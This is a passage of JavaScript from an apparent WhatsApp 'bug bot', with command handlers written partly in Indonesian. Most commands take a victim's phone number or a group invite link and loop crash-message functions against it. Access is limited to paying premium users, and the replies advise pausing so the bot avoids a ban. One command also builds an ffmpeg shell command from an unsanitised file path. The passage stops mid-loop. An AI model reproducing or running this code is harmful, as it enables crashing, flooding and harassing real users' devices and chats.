case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('./lib/uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? afgan.user.jid : m.sender;
//const name = await afgan.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await afgan.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  afgan.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break
case 'goyang': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'jomok': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'kekuatanhitam': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'cringe': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await afgan.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "jids-unexpected": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-lol": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "maaf-ya": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-toui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-engine": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
afgan.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break
case "systemuicrash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "devil-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "devil-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "afgan-novo": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "afgan-crash1": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup": {
  
    if (!isPremium) return reply(mess.only.premium)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await afgan.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONE BUG HAS BEEN SENT TO THE GROUP!.*");
      afgan.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "reset-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await afgan.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* \n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await afgan.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'devilbug': case '🌹': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'bug-vip': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
//=================================================//
case '🗿': case 'afgan-virus': case 'crash-total': case '🔥': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'chace-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
